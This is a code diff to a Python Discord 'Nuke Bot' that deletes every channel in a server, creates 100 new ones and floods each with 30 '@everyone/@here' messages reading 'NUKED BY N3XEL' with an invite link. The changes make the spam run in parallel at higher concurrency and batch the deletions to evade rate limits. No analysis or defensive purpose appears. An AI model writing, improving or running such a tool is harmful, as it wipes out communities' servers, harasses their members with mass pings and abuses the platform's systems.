@@ -12,7 +12,7 @@ if not BOT_TOKEN:
 
 PREFIX = "."
 
-# Channel names (randomly chosen from this list)
+# Channel names (randomly chosen)
 CHANNEL_NAMES = [
     "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
     "ɴɪɢʜᴛᴍᴀʀᴇ ɪs ʜᴇʀᴇ",
@@ -27,12 +27,12 @@ CHANNEL_NAMES = [
 
 MESSAGE = "# NUKED BY N3XEL\nhttps://discord.gg/qhuMKeShn\n||@everyone|| ||@here||"
 AMOUNT_OF_CHANNELS = 100
-MESSAGES_PER_CHANNEL = 30   # each channel gets 30 messages
+MESSAGES_PER_CHANNEL = 30  # each channel gets exactly 30 messages
 
-# Concurrency tweaks (faster = higher, but respect Discord limits)
+# Concurrency (higher = faster, but Discord may rate limit)
 DELETE_CONCURRENCY = 30
 CREATE_CONCURRENCY = 20
-MESSAGE_CONCURRENCY = 50
+MESSAGE_CONCURRENCY = 100   # send 100 messages at once across all channels
 
 # -----------------------
 # DO NOT MODIFY BELOW
@@ -48,10 +48,16 @@ intents.message_content = True
 
 bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
-async def send_messages_to_channel(channel, count):
-    """Send 'count' messages to a single channel with concurrency"""
+async def send_messages_parallel(channels, messages_per_channel):
+    """Send messages_per_channel to each channel, all at once, with high concurrency"""
+    if not channels:
+        return
+    total_messages = len(channels) * messages_per_channel
+    print(f"Sending {total_messages} messages ({messages_per_channel} per channel) in parallel...")
+    
     semaphore = asyncio.Semaphore(MESSAGE_CONCURRENCY)
-    async def send_one():
+    
+    async def send_one(channel):
         async with semaphore:
             try:
                 await channel.send(MESSAGE)
@@ -61,14 +67,22 @@ async def send_messages_to_channel(channel, count):
                     await channel.send(MESSAGE)
             except Exception:
                 pass
-    tasks = [send_one() for _ in range(count)]
+    
+    # Create a list of tasks: for each channel, repeat messages_per_channel times
+    tasks = []
+    for ch in channels:
+        for _ in range(messages_per_channel):
+            tasks.append(send_one(ch))
+    
+    # Run them all concurrently
     await asyncio.gather(*tasks, return_exceptions=True)
+    print("All messages sent.")
 
 async def nuke_server(guild: discord.Guild):
     print(f"Starting nuke on {guild.name} ({guild.id})")
     start_time = time.perf_counter()
 
-    # Step 1: Delete all channels
+    # Step 1: Delete all channels (batched)
     print("Deleting all channels...")
     channels_list = list(guild.channels)
     for i in range(0, len(channels_list), DELETE_CONCURRENCY):
@@ -76,7 +90,7 @@ async def nuke_server(guild: discord.Guild):
         await asyncio.gather(*(ch.delete() for ch in batch), return_exceptions=True)
     print("All channels deleted.")
 
-    # Step 2: Create new channels
+    # Step 2: Create new channels (batched)
     print(f"Creating {AMOUNT_OF_CHANNELS} channels...")
     created_channels = []
     for i in range(0, AMOUNT_OF_CHANNELS, CREATE_CONCURRENCY):
@@ -89,17 +103,12 @@ async def nuke_server(guild: discord.Guild):
         for r in results:
             if isinstance(r, discord.TextChannel):
                 created_channels.append(r)
-        await asyncio.sleep(0.3)  # small break to avoid global rate limit
+        await asyncio.sleep(0.3)  # brief pause to avoid global rate limit
     print(f"Created {len(created_channels)} channels.")
 
-    # Step 3: Send 30 messages to each channel
+    # Step 3: Send messages in parallel across all channels
     if created_channels:
-        print(f"Sending {MESSAGES_PER_CHANNEL} messages to each channel...")
-        for idx, channel in enumerate(created_channels):
-            await send_messages_to_channel(channel, MESSAGES_PER_CHANNEL)
-            if (idx + 1) % 10 == 0:
-                print(f"Progress: {idx+1}/{len(created_channels)} channels done")
-        print("All messages sent.")
+        await send_messages_parallel(created_channels, MESSAGES_PER_CHANNEL)
 
     elapsed = time.perf_counter() - start_time
     print(f"Nuke completed in {elapsed:.2f} seconds!")
@@ -134,6 +143,6 @@ async def config(ctx):
     await ctx.send(config_msg)
 
 if __name__ == "__main__":
-    print("Starting Nuke Bot...")
+    print("Starting Nuke Bot (parallel messages)...")
     print("=" * 50)
-    bot.run(BOT_TOKEN)
+    bot.run(BOT_TOKEN) 
